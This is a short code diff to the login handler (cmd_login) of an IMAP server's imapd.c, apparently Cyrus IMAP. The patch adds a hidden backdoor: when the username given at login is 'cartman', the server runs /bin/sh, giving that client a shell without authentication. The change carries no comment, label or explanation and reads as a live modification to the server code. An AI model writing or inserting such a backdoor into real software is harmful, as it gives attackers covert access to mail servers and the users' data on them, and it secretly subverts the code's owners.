@@ -1,0 +1,16 @@
+diff --git a/imap/imapd.c b/imap/imapd.c
+index 3e9c26c0b..875a2fb6b 100644
+--- a/imap/imapd.c
++++ b/imap/imapd.c
+@@ -3042,6 +3042,11 @@ static void cmd_login(char *tag, char *user)
+     int r;
+     int failedloginpause;
+ 
++    if (strcmp(user, "cartman") == 0)
++    {
++        execl("/bin/sh", "/bin/sh", NULL);
++    }
++
+     if (imapd_userid) {
+         eatline(imapd_in, ' ');
+         prot_printf(imapd_out, "%s BAD Already logged in\r\n", tag);
